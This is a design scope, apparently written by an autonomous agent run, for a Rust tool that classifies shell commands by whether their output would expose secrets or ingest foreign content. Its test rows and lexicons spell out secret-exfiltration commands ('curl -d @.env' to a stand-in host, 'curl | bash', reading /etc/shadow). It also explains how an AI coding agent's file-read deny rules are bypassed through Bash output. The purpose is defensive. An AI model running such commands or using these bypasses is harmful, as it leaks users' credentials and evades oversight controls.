# Scope: `caro.disclosure.v1` — Classify What a Command's Output Will Contain, Before It Exists

> **Provenance.** Produced by the `caro-research--scoping-process` scheduled task,
> autonomous run, **2026-09-09**, no user present. The template's `[FEATURE NAME]`
> shipped unbound; target selection rationale is in §0.
>
> **This is a scope, not an implementation.** No branch, no PR, no code committed
> (`.claude/rules/git-workflow.md`). Companion ADR:
> [`docs/adr/ADR-068-output-disclosure-classification.md`](docs/adr/ADR-068-output-disclosure-classification.md).

---

## 0. Target selection

Every ADR from 024 to 067 judges a command by **what it does to the machine** — what it
writes, deletes, reaches, spawns, or costs. ADR-064 asks whether bytes leave the sandbox.
ADR-066 asks whether path operands stay inside their roots. ADR-067 asks where the
interpreters are. None of them asks the question that the upstream cohort's own September
changelog makes urgent:

**what will this command's stdout contain, and what does putting those bytes into a model's
context cost?**

That question has a shipped, dated, and documented gap on the other side. Claude Code
v2.1.261 (2026-09-04) *widened* the channel by design, and its only inspection point for
what flows through it fires after the fact. §1 documents both. Caro is a pure
pre-execution subprocess with a pattern engine and a redaction lexicon already in the tree;
it is the natural place to answer the question **before** the bytes exist.

---

## 1. Phase 1 — Feature research

### 1.1 The feature

**Claude Code's tool-output pathway**, as of v2.1.261 (2026-09-04), read 2026-09-09:

| Layer | What it governs | When it runs |
|---|---|---|
| `permissions.read.{allow,deny}` — gitignore-syntax path rules | which **file paths** the `Read`/`Edit` tools may touch | before the tool call |
| `permissions.bash.*` — command matchers, subcommand splitting | whether a **command** may run | before execution |
| `bashOutputMaxChars` / `taskOutputMaxChars` — **new in v2.1.261** | how many characters of command and background-task output the model receives **inline** before the output is spilled to a file; **raisable to 128K** | after execution |
| `PostToolUse` hook, `updatedToolOutput` | rewriting or filtering tool output before the model reads it | **after execution**, and it *cannot block* |

Verbatim from the v2.1.261 release notes
([github.com/anthropics/claude-code/releases/tag/v2.1.261](https://github.com/anthropics/claude-code/releases/tag/v2.1.261),
read 2026-09-09):

> Added `bashOutputMaxChars` and `taskOutputMaxChars` settings to raise how much command and
> background-task output Claude receives inline before it is saved to a file, up to 128K
> characters

The same release also contains two entries that show the shape of the current mitigation
strategy — **per-vector patches, not a structural model**:

> Improved the dangerous-`rm` safety prompt to also catch `rm -rf` on positional parameters
> and inside double-quoted `sh -c` scripts

> Changed auto mode to treat a link that packs content into a public diagram renderer's URL
> as an upload to that site: no longer auto-approved unless you asked for it

The second is a disclosure fix — one specific exfiltration shape (content packed into a
renderer URL), closed by name. It is the right fix and it does not generalize, because
there is no vocabulary in the system for *"these bytes are confidential"* or *"these bytes
are foreign"* that a rule could be written against.

### 1.2 The problem it solves, and for whom

For agent operators: keep the transcript small and useful, and let a hook clean up output
before the model reads it. It works for its stated purpose. The purpose is *ergonomics and
truncation*, not *disclosure control* — the layer was never designed to answer the question
in §0, and nothing else in the system answers it either.

### 1.3 Architecture, data flow, separation of concerns

```
command text ──▶ [bash permission matcher] ──▶ execute ──▶ stdout bytes
                        (path/command rules)                   │
file path   ──▶ [read allow/deny rules] ──▶ Read tool ─────────┤
                                                               ▼
                                               [truncate at bashOutputMaxChars]
                                                               │
                                               inline ◀────────┴────────▶ spill to file
                                                    │                          │
                                                    ▼                          ▼
                                             [PostToolUse hook]          (file on disk,
                                              updatedToolOutput           read back later,
                                                    │                     rules re-applied
                                                    ▼                     or not)
                                            model context window
```

The separation is clean and it is the source of the bug: **the read-rule layer is attached
to a tool, and the byte-source is attached to a command.** Two doors onto the same file,
one lock.

### 1.4 Why it is limited — the failure-mode corpus

All read 2026-09-09.

**F1 — The `Read()` deny rules do not cover the Bash door.**
[Issue #24846](https://github.com/anthropics/claude-code/issues/24846) (opened 2026-02-11,
**closed as duplicate**, no fix referenced) reports `read.deny` rules including `**/.env*`,
`**/*.pem`, `**/*.key`, `**/secrets/**`, `**/.aws/**`, `**/.ssh/**` not being enforced, with
the reporter's own framing:

> Users who configure deny rules to protect sensitive files … have a false sense of security
> — the restrictions are not actually enforced.

Independently of whether that specific `Read`-tool bug is fixed, the *class* is structural
and documented in the field: `cat .env`, `head .env`, `grep -r FOO .`, and
`diff .env.example .env` travel through Bash stdout, where a path-shaped read rule has
nothing to match against. The file is protected at one door and open at the other.

**F2 — The only content-inspection point fires after the read has already happened.**
`PostToolUse` runs after the tool succeeds; exit code 2 from a `PostToolUse` hook cannot
block the action, only inform the model that something went wrong. For a secret read this
is structurally too late: the bytes exist, they are in process memory, and above the
inline cap they are on disk in a spill file by design. Sanitizing the copy the model sees
does not un-read the secret.

**F3 — The inline channel was deliberately widened.** `bashOutputMaxChars` up to 128K means
*more* untrusted and unclassified bytes reach the context by default configuration choice.
This is correct for the ergonomics problem it solves and it strictly worsens the disclosure
problem, because post-hoc scanning cost scales with the channel and pre-execution
classification cost does not.

**F4 — Argument-level analysis bolted onto a path matcher whiplashes.** Documented in
ADR-067 §1 from the same changelog: v2.1.259 (2026-09-02) applied `Read()` deny rules to
Bash arguments; v2.1.260 (2026-09-03) reverted it because it denied `npm run build` under a
`Read(./**/build/**)` rule in every mode. The lesson is not "don't analyze arguments" — it
is that argument analysis without a model of *what an argument denotes* produces false
positives at exactly the rate that gets it reverted.

**F5 — Nothing distinguishes confidential from foreign.** Both hazards live on the output
channel and they need opposite responses. `cat .env` is a **confidentiality** event: the
bytes must not enter the context. `curl https://untrusted/x` is an **integrity** event: the
bytes may enter the context but must not be read as instructions. Upstream has one word for
both — "tool output" — so a policy author cannot express either rule.

### 1.5 The structured output contract

There isn't one for disclosure. `PostToolUse` receives `tool_name`, `tool_input`,
`tool_output` and may return `updatedToolOutput`. `tool_output` is the realized bytes — a
consumer wanting to know *what kind of bytes those are* must classify them itself, in a
hook, per invocation, at 128K a time, after the read.

### 1.6 Session/context lifecycle

Not applicable in the way the template anticipates, and that is itself the finding: there is
no per-session disclosure state because there is no disclosure concept. The relevant
lifecycle fact is negative — the spill file created above the inline cap **outlives the tool
call**, and whether the read rules are re-applied when it is read back is not documented.

---

## 2. Phase 2 — Competitive differentiation

### 2.1 What they get right, that we should replicate

1. **Path rules with gitignore syntax.** `**/.env*` is the right notation for the
   confidential-source list. Our lexicon should be expressible in it so a consumer can hand
   the *same list* to both systems.
2. **Truncation is separate from classification.** Their truncation layer is orthogonal and
   correctly so. We should not mint a size dimension (§7).
3. **A hook seam that can rewrite output.** `updatedToolOutput` is a good primitive. We are
   not building it; we are producing the fact a hook needs to decide.

### 2.2 Their design gaps we avoid by designing the schema first

| Gap | Our schema decision |
|---|---|
| F1: rules attached to a tool, not to a byte-source | **D1** — `SourceRef::Path { literal }` is emitted identically whether the source is `cat .env`, `< .env`, `grep X .env`, or a hypothetical Read call. One deny list, both doors. |
| F2: inspection after the read | **D2** — the scanner is a pure function of the command string. It never opens a file, never executes anything, never stats a path. |
| F4: argument analysis with no denotation model | **D3** — every operand is *attributed* to a source or explicitly listed in `coverage.unattributed`. The invariant is arithmetic and tested, so a false positive is traceable to a named lexicon row rather than to a glob that happened to match. |
| F5: one word for two hazards | **D4** — `Provenance::Confidential` and `Provenance::Foreign` are separate variants with separate verdicts and separate exit behaviour. |
| Silent defaulting | **D5** — `Provenance::Unknown` is a distinct variant, never collapsed into `Workspace`. Absence of a classification and a classification of "harmless" must not share a representation. This is ADR-067's `Opaque` lesson, restated on the source axis. |

### 2.3 Our unique positioning

- **Pre-execution.** Caro already sits before the command runs. Everyone else's output layer
  sits after. This is not a feature we add; it is where we already are.
- **No-read-to-check.** The scanner is lexical. It answers "would this disclose `.env`?"
  *without opening `.env`*. A post-hoc scanner must read the secret to decide the secret was
  read. No TOCTOU window, no accidental self-disclosure.
- **Standalone subprocess, host-agnostic.** One `caro disclose` call serves Claude Code
  hooks, a CI gate, a git pre-commit, an MCP gateway, or a shell function. The
  classification does not live inside one vendor's agent loop.
- **Offline.** No network, no model call, no daemon. Deterministic on an air-gapped box.

### 2.4 Existing caro infrastructure this reuses

Verified against the tree at `1.4.0` (`Cargo.toml:version`), 2026-09-09:

| Component | Location | Role here |
|---|---|---|
| `SafetyConfig { safety_level, max_command_length, custom_patterns, allowlist_patterns }` | `src/safety/mod.rs:166` | scanner construction; **no new config type** |
| `SafetyLevel { Strict, Moderate, Permissive }` | `src/models/mod.rs:247` | exit/routing modulation |
| `RiskLevel { Safe, Moderate, High, Critical }` | `src/models/mod.rs:152` | report risk field; **no new tier** (ADR-059 moratorium) |
| `SuggestedRouting::from_risk_and_safety` | `src/models/mod.rs:189+` | routing field; canonical mapping reused verbatim |
| `ShellType { Bash, Zsh, Fish, Sh, PowerShell, Cmd, Unknown }` | `src/models/mod.rs:419` | dialect input |
| `Redaction::{redact, contains_sensitive}` + `API_KEY_PATTERN` | `src/logging/redaction.rs:6,55,62` | (a) detects an inline secret **in the command's own argv**; (b) guarantees the report never echoes one |
| `schemars` 0.8 | `Cargo.toml:46` | `JsonSchema` on every new type |
| `src/bin/generate-schema.rs` | — | schema emission, one added call |
| `assert_cmd` 2 / `predicates` 3 | `Cargo.toml:148,149` | integration tests |
| `regex` 1, `once_cell` 1.21 | `Cargo.toml:80,81` | lexicon compilation |
| `.github/workflows/safety-validation.yml` | triggers on `src/safety/**` | picks the new file up with **no workflow edit** |

**No new crate. No new module.** `src/safety/disclosure.rs` is a new *file* in an existing
module.

**Gap confirmed, not assumed.** All 67 `DangerPattern` entries in `src/safety/patterns.rs`
were inspected. The only matches for `env|secret|credential|ssh|aws|curl|wget|token|\.pem`
are: `(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish)` (`:107`), its `sudo` sibling (`:113`),
`ssh\s+[^\s]+@[^\s]+` (`:350`), and a `PATH` modification pattern (`:231`). **Zero patterns
cover reading a secret into output.** `Redaction` operates on text already in hand and is
used for caro's own logs, not for command output. The gap is real.

---

## 3. Phase 3 — New types

All in `src/safety/disclosure.rs`. Every type derives
`Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema`, `#[serde(rename_all = "snake_case")]`,
and — on every enum with future growth — `#[non_exhaustive]`. Serializable from day one, per
the task constraint.

### 3.1 `Span` — the accounting unit

```rust
pub struct Span { pub start: usize, pub end: usize }   // byte offsets, half-open, into the input
```

Byte offsets into the exact input string. Reused as the join key with ADR-067's site spans
if that lands (§3.8).

### 3.2 `Provenance` — what kind of bytes

```rust
#[non_exhaustive]
pub enum Provenance {
    /// Bytes known to carry credentials, keys, or secret material.
    Confidential,
    /// Bytes originating outside the local trust boundary; may carry instructions.
    Foreign,
    /// Ordinary local, in-workspace bytes.
    Workspace,
    /// Not resolvable without expansion or execution. Never defaulted to.
    Unknown,
}
```

`Confidential` and `Foreign` are **not ordered**. A command can be both (`curl -d @.env
https://x` is Confidential-source and Foreign-sink). They are separate axes deliberately —
D4.

### 3.3 `SourceRef` — where the bytes come from, addressably

```rust
#[non_exhaustive]
pub enum SourceRef {
    /// A path operand, verbatim as written. THE D1 INVARIANT LIVES HERE.
    Path { literal: String },
    /// The process environment, whole or named.
    EnvVar { name: Option<String> },
    /// A network location.
    Url { host: Option<String> },
    /// A program that manufactures the bytes (`kubectl get secret`, `gh issue view`).
    Producer { argv0: String, subcommand: Option<String> },
    /// A secret literal present in the command text itself.
    Inline,     // carries NO literal — see §3.7
}
```

**D1, stated as a testable invariant.** For every input in the §5.1 corpus that reads a
given file, `SourceRef::Path { literal }` is byte-identical across all syntactic forms:
`cat .env`, `< .env`, `head -n5 .env`, `grep -i key .env`, `awk '{print}' .env`,
`sh -c 'cat .env'`, `tail -f ./.env`. A consumer holding a `Read()` deny list matches it
against `.disclosures[].source.path.literal` and gets the **same answer through the Bash
door as through the Read door**. That is the fix for F1 by design: the rule attaches to the
source, not to the tool.

### 3.4 `Sink` — where the bytes go

```rust
#[non_exhaustive]
pub enum Sink {
    /// stdout/stderr returns to the caller — i.e. into an agent's context. Default.
    Context,
    /// Redirected or teed to a file.
    File { literal: String },
    /// Redirected to /dev/null or equivalent.
    Discarded,
    /// Piped into an interpreter — the bytes become code.
    Interpreter { argv0: String },
    /// Sent to a network peer.
    Network { host: Option<String> },
}
```

`Network` overlaps ADR-064's egress axis. It is included rather than deferred because
ADR-064 is unmerged paper, and a `Confidential → Network` command with no finding at all is
the worst available outcome. §7.3 records the merge seam.

### 3.5 `Disclosure` — one classified flow

```rust
pub struct Disclosure {
    pub id: u32,                  // stable, assigned in span order from 0
    pub source: SourceRef,
    pub provenance: Provenance,
    pub sink: Sink,
    pub span: Span,               // the operand or producer token that produced this
    pub rule: String,             // the lexicon row id that fired, e.g. "conf.path.dotenv"
}
```

`rule` is mandatory and is a stable identifier, not prose. A false positive is then a bug
report against exactly one lexicon row (the F4 lesson).

### 3.6 `Coverage` — the fail-closed accounting

```rust
pub struct Coverage {
    pub operands_total: u32,
    pub operands_attributed: u32,
    pub unattributed: Vec<Span>,
}
```

**Invariant (tested, §5.3):** `operands_total == operands_attributed + unattributed.len()`.

A non-empty `unattributed` downgrades the verdict to at least `Opaque`. The scanner is not
permitted to reach `Clear` while admitting it did not account for part of the input — D3.

### 3.7 `DisclosureReport` — the wire document

```rust
pub struct DisclosureReport {
    pub schema: String,             // "caro.disclosure.v1" — constant
    pub caro_version: String,       // env!("CARGO_PKG_VERSION")
    pub command_sha256: String,     // hex sha256 of the exact input bytes; sha2 already a dep
    pub shell: ShellType,
    pub safety_level: SafetyLevel,
    pub disclosures: Vec<Disclosure>,
    pub coverage: Coverage,
    pub verdict: DisclosureVerdict,
    pub risk_level: RiskLevel,
    pub routing: SuggestedRouting,
}
```

**The report must not itself be a disclosure.** The document carries `command_sha256`, never
the command text. `SourceRef::Inline` carries no literal — only its span — precisely because
the thing it found is a secret. Before serialization every string-valued field passes
through `Redaction::redact` (`src/logging/redaction.rs:55`). Asserted in §5.3.

### 3.8 `DisclosureVerdict`

```rust
#[non_exhaustive]
pub enum DisclosureVerdict { Exposure, Ingestion, Opaque, Clear }
```

Precedence, highest first: `Exposure > Ingestion > Opaque > Clear`. The verdict is the max
over `disclosures`; nothing is lost, because every individual flow is still in the array.

### 3.9 Method contracts

```rust
impl DisclosureScanner {
    /// Reuses SafetyConfig; mints no config type of its own.
    pub fn new(config: &SafetyConfig) -> Self;

    /// Pure. Never opens a file, never stats a path, never spawns a process,
    /// never reads the clock, never touches the network. Same input → same bytes out.
    pub fn scan(&self, command: &str, shell: ShellType) -> DisclosureReport;

    /// ADR-067 seam. Identical semantics, restricted to the given spans, so that
    /// `decompose`'s per-site text can be scanned individually if that verb lands.
    /// Signature chosen now so the swap is internal later.
    pub fn scan_spans(&self, command: &str, shell: ShellType, spans: &[Span]) -> DisclosureReport;
}

impl DisclosureReport {
    pub fn verdict(&self) -> DisclosureVerdict;
    pub fn risk_level(&self) -> RiskLevel;
    pub fn routing(&self, safety: SafetyLevel) -> SuggestedRouting;
    pub fn exit_code(&self, safety: SafetyLevel) -> i32;
}
```

---

## 4. Semantics

### 4.1 The confidential lexicon (v1 — a closed set, fail-closed outside it)

**Path rows** (`rule` ids under `conf.path.*`), matched lexically against the operand as
written, in gitignore syntax so the same list is portable to a `Read()` deny block:

| id | glob |
|---|---|
| `conf.path.dotenv` | `**/.env`, `**/.env.*`, `**/*.env` |
| `conf.path.key` | `**/*.pem`, `**/*.key`, `**/*.p12`, `**/*.pfx`, `**/*.jks`, `**/*.keystore` |
| `conf.path.ssh` | `**/.ssh/**`, `**/id_rsa`, `**/id_ed25519`, `**/id_ecdsa`, `**/id_dsa` |
| `conf.path.cloud` | `**/.aws/credentials`, `**/.aws/config`, `**/.kube/config`, `**/.docker/config.json` |
| `conf.path.pkg` | `**/.npmrc`, `**/.pypirc`, `**/.netrc`, `**/.pgpass`, `**/.git-credentials` |
| `conf.path.dir` | `**/secrets/**`, `**/credentials/**` |

**Producer rows** (`conf.prod.*`), matched on `argv0` plus subcommand prefix:

| id | forms |
|---|---|
| `conf.prod.env` | `printenv`, bare `env`, `export -p`, `set` under `Sh`/`Bash`/`Zsh` |
| `conf.prod.aws` | `aws configure list`, `aws sts get-session-token`, `aws secretsmanager get-secret-value` |
| `conf.prod.gcloud` | `gcloud auth print-access-token`, `gcloud secrets versions access` |
| `conf.prod.az` | `az account get-access-token`, `az keyvault secret show` |
| `conf.prod.k8s` | `kubectl get secret*`, `kubectl describe secret*` |
| `conf.prod.git` | `git config --list`, `git config --get-regexp` |
| `conf.prod.vault` | `vault read`, `vault kv get`, `op read`, `op item get` |
| `conf.prod.keychain` | `security find-generic-password`, `secret-tool lookup` |
| `conf.prod.paas` | `heroku config`, `fly secrets list`, `gh auth token` |
| `conf.inline` | `Redaction::contains_sensitive(command) == true` — a secret literal in the argv itself |

`conf.inline` deserves its own note: `curl -H "Authorization: Bearer sk-live-…"` puts the
credential in the process table, in shell history, and in the agent transcript. It is a
disclosure with no file and no producer, and it is free to detect because the lexicon
already exists at `src/logging/redaction.rs:6`.

### 4.2 The foreign lexicon (`foreign.*`)

| id | forms |
|---|---|
| `foreign.http` | `curl`, `wget`, `http`/`https` (httpie), `fetch` |
| `foreign.vcs` | `git clone`, `git fetch`, `git ls-remote`, `git log <remote>/…`, `git show <remote>/…` |
| `foreign.forge` | `gh issue view`, `gh pr view`, `gh pr diff`, `gh api`, `gh run view --log`, `glab …` |
| `foreign.registry` | `npm view`, `npm info`, `pip download`, `pip index` |
| `foreign.logs` | `docker logs`, `kubectl logs` |
| `foreign.dns` | `dig`, `host`, `nslookup` — the DNS-TXT-into-an-interpreter vector |
| `foreign.remote` | `ssh <host> <cmd>`, `nc`, `ncat`, `socat` |

### 4.3 Operand attribution, and where `Unknown` comes from

An operand token is classified in this order, first match wins:

1. Matches a `conf.path.*` glob → `Confidential`.
2. Contains `$`, backtick, `~`, `*`, `?`, `[`, or `..` → **`Unknown`**. No expansion is
   performed (§7.1), so the denotation is not knowable and must not be guessed.
3. Absolute path outside the current working directory as written → `Unknown`.
4. Plain relative literal, no traversal → `Workspace`.

Rule 2 is the fail-closed core. `cat $SECRETS_FILE` is `Unknown`, never `Workspace`.
Rule 4 is what keeps `cat README.md` quiet, which is what stops this from becoming the
v2.1.259 revert (F4).

Operands the scanner cannot even tokenize into one of the four buckets land in
`coverage.unattributed` rather than being dropped.

### 4.4 Sink resolution

Default is `Context`. Overridden, per flow, by:

| Syntax | Sink |
|---|---|
| `> f`, `>> f`, `\| tee f` | `File { literal: "f" }` |
| `> /dev/null`, `&> /dev/null`, `2>&1 >/dev/null` | `Discarded` |
| `\| sh`, `\| bash`, `\| zsh`, `\| python`, `\| perl`, `\| ruby`, `\| node` | `Interpreter { argv0 }` |
| `\| curl …`, `\| nc host port`, `curl -d @- …`, `curl --data-binary @f` | `Network { host }` |

Unrecognized sink syntax does not silently become `Context`; the flow's operand goes to
`coverage.unattributed` and the report downgrades to `Opaque`.

### 4.5 Verdict, risk, routing, exit

| Condition | Verdict | Risk | Exit at `permissive` / `moderate` | Exit at `strict` |
|---|---|---|---|---|
| any `Confidential` source → `Context`, `File`, or `Network` sink | `Exposure` | `High`, or `Critical` when sink is `Network` | **2** | **2** |
| no exposure; any `Foreign` source → `Context` or `Interpreter` sink | `Ingestion` | `Moderate` | 0 | **2** |
| no exposure or ingestion; any `Unknown` source → non-`Discarded` sink, **or** `coverage.unattributed` non-empty | `Opaque` | `Moderate` | 0 | **2** |
| everything attributed, nothing above | `Clear` | `Safe` | 0 | 0 |

`Confidential → Discarded` (`cat .env > /dev/null`) is not a finding. It is pointless, but
no bytes reach anyone.

`routing` is `SuggestedRouting::from_risk_and_safety(risk_level, safety_level)` — the
canonical mapping at `src/models/mod.rs:189+`, used verbatim. **No new risk tier and no new
routing variant is minted**, per the ADR-059 moratorium.

`Ingestion` exits 0 outside `strict` on purpose. `curl https://api.example.com/health` is
the single most common benign command in the corpus this tool will see, and a verb that
exits non-zero on it will be removed from CI within a day. The *finding is still in the
document* — the exit code is the shell-friendly shortcut, the `verdict` field is the
contract.

**Exit-code collision, stated rather than papered over.** `clap` emits `2` for usage errors,
and ADR-065, ADR-066 and ADR-067 all chose `2` for a finding. This scope inherits that
rather than forking a fifth convention for the fourth verb in a row. Machine consumers
disambiguate in this order:

1. A usage error writes nothing to stdout; a finding writes a complete `caro.disclosure.v1`
   document.
2. `out=$(caro disclose "$cmd" -o json)`; `if [ -z "$out" ]` → usage error; otherwise read
   `.verdict`.
3. The contract is `verdict`, not the exit code.

The reserved-per-verb-exit-range fix belongs to one PR covering 065/066/067/068 together
(§7.4), not to a fourth unilateral choice here.

### 4.6 Determinism

The scanner performs **no I/O of any kind**: no `open`, no `stat`, no `spawn`, no clock, no
RNG, no network. This is what makes "answer whether `.env` would be disclosed without
reading `.env`" true rather than aspirational, and it is asserted directly in §5.3.

---

## 5. Files that change

Minimal set. **Two new source files, three edited, no new module, no new crate.**

| # | File | Change |
|---|---|---|
| 1 | `src/safety/disclosure.rs` | **new** — all types in §3, the lexicons in §4.1/§4.2, `DisclosureScanner` |
| 2 | `src/safety/mod.rs` | `pub mod disclosure;` and re-export of the public types |
| 3 | `src/main.rs` | `Disclose { command, shell, safety, output }` variant on the subcommand enum (`Check` at `:514` is CaroML file validation and is not a host for this), dispatch arm, exit mapping |
| 4 | `src/bin/generate-schema.rs` | one added `schema_for!(DisclosureReport)` → `.vscode/caro-disclosure.schema.json` |
| 5 | `tests/disclosure_contract.rs` | **new** — §6 |
| 6 | `docs/adr/ADR-068-output-disclosure-classification.md` | the ADR |

`.github/workflows/safety-validation.yml` needs **no edit**: its `pull_request.paths`
already includes `src/safety/**` (verified 2026-09-09, `:5`).

Commit ordering, if a human takes this forward:

1. `feat(safety)` — types + lexicons + unit tests (file 1, 2). Independently reviewable;
   the lexicons are the part that wants scrutiny.
2. `feat(cli)` — verb, dispatch, exit mapping, `tests/disclosure_contract.rs` (files 3, 5).
3. `chore(schema)` — schema emission (file 4).

---

## 6. Integration tests

`tests/disclosure_contract.rs`, using `assert_cmd` + `predicates` (both already dev-deps).
Every row invokes `caro disclose <input> --shell <sh> --safety <level> -o json` and asserts
the **full** `verdict`, the **complete** `disclosures` array (ids, source, provenance, sink,
span, rule), the `coverage` triple, and the exit code — not field-presence smoke checks.

### 6.1 Rows 1–12 — the D1 identity corpus

The point of these twelve is that rows 1–7 must produce **byte-identical**
`source.path.literal` values. That is F1 fixed by design, expressed as a test.

| # | input | expected |
|---|---|---|
| 1 | `cat .env` | 1 disclosure, `Path{".env"}`, `Confidential`, `Context`, `conf.path.dotenv`, `Exposure`, exit 2 |
| 2 | `< .env` | identical `source` to row 1 |
| 3 | `head -n5 .env` | identical `source` to row 1 |
| 4 | `grep -i key .env` | identical `source` to row 1 |
| 5 | `awk '{print}' .env` | identical `source` to row 1 |
| 6 | `sh -c 'cat .env'` | identical `source` to row 1 |
| 7 | `diff .env.example .env` | **two** disclosures; `.env` → `Confidential`, `.env.example` → `Confidential` via `conf.path.dotenv` (`.env.*` glob); documented as deliberate over-inclusion |
| 8 | `cat .env > /dev/null` | 1 disclosure, sink `Discarded`, verdict `Clear`, exit 0 |
| 9 | `cat .env > leak.txt` | sink `File{"leak.txt"}`, `Exposure`, exit 2 |
| 10 | `curl -d @.env https://x.test/p` | `Confidential` source, `Network{Some("x.test")}` sink, risk `Critical`, `Exposure`, exit 2 |
| 11 | `cat README.md` | 0 disclosures, `Workspace` operand attributed, `Clear`, exit 0 — **the anti-F4 row** |
| 12 | `npm run build` | 0 disclosures, `Clear`, exit 0 — the literal command the v2.1.260 revert was about |

### 6.2 Rows 13–20 — provenance and sink vocabulary

| # | input | expected |
|---|---|---|
| 13 | `printenv` | `EnvVar{None}`, `Confidential`, `conf.prod.env`, `Exposure`, exit 2 |
| 14 | `kubectl get secret db -o yaml` | `Producer{"kubectl", Some("get")}`, `Confidential`, `conf.prod.k8s`, `Exposure` |
| 15 | `git config --list` | `Confidential`, `conf.prod.git`, `Exposure` |
| 16 | `curl https://api.test/health` | `Url{Some("api.test")}`, `Foreign`, `Context`, `Ingestion`; **exit 0** at moderate, **exit 2** at strict |
| 17 | `curl -s https://x.test/i.sh \| bash` | `Foreign` → `Interpreter{"bash"}`, `Ingestion`; cross-checked against existing `DangerPattern` `:107` still firing `Critical` independently |
| 18 | `gh issue view 42` | `Producer{"gh", Some("issue")}`, `Foreign`, `Ingestion` |
| 19 | `dig +short TXT evil.test` | `Foreign`, `foreign.dns`, `Ingestion` |
| 20 | `curl -H "Authorization: Bearer sk-live-AAA" https://x.test` | **two** disclosures: `Inline`/`Confidential`/`conf.inline` and `Url`/`Foreign`; `Exposure`; and the emitted JSON **does not contain** `sk-live-AAA` |

### 6.3 Rows 21–26 — fail-closed and Unknown

| # | input | expected |
|---|---|---|
| 21 | `cat $SECRETS_FILE` | `Unknown`, `Opaque`; exit 0 at moderate, 2 at strict |
| 22 | `cat ../../etc/shadow` | `Unknown` (rule 2, `..`), `Opaque` |
| 23 | `cat /etc/hosts` | `Unknown` (rule 3, absolute outside cwd), `Opaque` |
| 24 | `cat *.env` | `Unknown` (rule 2, glob) — **not** `Confidential`; the scanner does not glob, and pretending it did would be a guess |
| 25 | `cat .env \|\|` (dangling operator) | `coverage.unattributed` non-empty, `Opaque`, and the `.env` disclosure still present |
| 26 | `Get-Content .env` with `--shell powershell` | `Opaque`; POSIX lexicons do not apply to a non-POSIX dialect (§7.5) |

### 6.4 Rows 27–32 — invariants

| # | assertion |
|---|---|
| 27 | For every row in §6.1–§6.3: `coverage.operands_total == operands_attributed + unattributed.len()` |
| 28 | For every row: the serialized report contains no substring of the input longer than 0 characters other than `source.path.literal` / `source.url.host` / `sink.file.literal` values, and contains `command_sha256` |
| 29 | For every row: `Redaction::contains_sensitive(serialized_report) == false` — **the report is not itself a disclosure** |
| 30 | `scan()` run twice on the same input produces byte-identical JSON (determinism) |
| 31 | `scan()` executed under a working directory containing a `.env` fixture leaves that file's atime/mtime unchanged and the process makes no `open` syscall against it — **the no-read property**, asserted with a fixture and a permissions-stripped file (mode `000`) that would `EACCES` if touched |
| 32 | Verdict precedence: an input with both a `Confidential→Context` and a `Foreign→Context` flow reports **both** disclosures and verdict `Exposure` |

Row 31 is the one that matters most. It is the difference between claiming the scanner is
pre-execution and proving it.

---

## 7. Explicitly out of scope

Next version, not this one:

1. **Expansion.** No `$VAR`, no `~`, no globbing, no word splitting, no alias resolution.
   `Unknown` is the seam that admits a future `Expanded` variant without a schema break, and
   if it lands it must stay distinguishable from `Verbatim` — same lesson as ADR-067.
2. **Output-volume estimation.** `bashOutputMaxChars` is a truncation concern and is
   correctly orthogonal (§2.1.2). Minting a size dimension here would couple classification
   to a host's buffer setting.
3. **The ADR-064 merge.** `Sink::Network` is carried here because ADR-064 is paper. If and
   when egress lands, the two must be reconciled in one PR that decides which document owns
   host matching and the ADR-047 trusted-targets registry — not by both emitting a host
   field and hoping they agree.
4. **Fixing the exit-code convention.** Four verbs now use `2` for a finding and collide
   with `clap`'s usage exit. One PR, reserved ranges, covering ADR-065/066/067/068.
5. **Non-POSIX dialects.** PowerShell and Cmd get `Opaque`. `Get-Content`, `$env:`,
   `Invoke-RestMethod` and `ConvertTo-SecureString` are a real lexicon and their own ADR.
6. **Policy over disclosures.** "Deny all `Confidential` sources", "`Foreign→Interpreter` is
   always `Block`" is policy vocabulary, closed by the ADR-059 moratorium until
   `caro.assessment.v1` merges. v1 emits facts.
7. **Content classification of realized output.** If a consumer already has the bytes, this
   verb is the wrong tool; that is `Redaction` territory and a different signature.
8. **User-extensible lexicons.** `SafetySection.custom_patterns` is a tempting host, but a
   user-supplied confidential glob needs a precedence story with `patterns.toml` and the
   profile system. v1 ships a closed set; extension is v2.
9. **Feeding disclosures back into generation.** "This command would leak `.env`, regenerate
   without it" is an agent-loop feature, not a validator feature.

---

## 8. Open questions for the human reviewer

Flagged rather than settled, because an autonomous run should not decide them alone:

1. **Is `diff .env.example .env` (row 7) a false positive?** `.env.example` is conventionally
   committed and contains no secrets, and the `**/.env.*` glob catches it. Options: accept
   the over-inclusion, add an `.env.example`/`.env.sample`/`.env.template` carve-out, or make
   the carve-out the first user-extensible lexicon row (§7.8). The scope takes the
   over-inclusive option because a false positive on a documented row is cheap and a false
   negative on `.env.local` is not — but this is a judgement call.
2. **Should `Ingestion` exit non-zero at `moderate`?** §4.5 says no, for usability. A
   reviewer running CI on a codebase where every `curl` is suspect may disagree. The
   `verdict` field makes either choice a one-line change with no schema impact.
3. **Does F1 warrant an upstream report rather than only an ADR?** Issue #24846 is closed as
   duplicate with no fix referenced, and the Bash-door class is broader than the issue it was
   duped into. Filing is a communication decision, not an engineering one.
4. **`rust-version = "1.85"` in `Cargo.toml` vs. "MSRV 1.83" in `CLAUDE.md`.** Noticed while
   verifying dependencies; unrelated to this scope, but the two disagree and one of them is
   wrong. Boy-scout fix, someone else's PR.
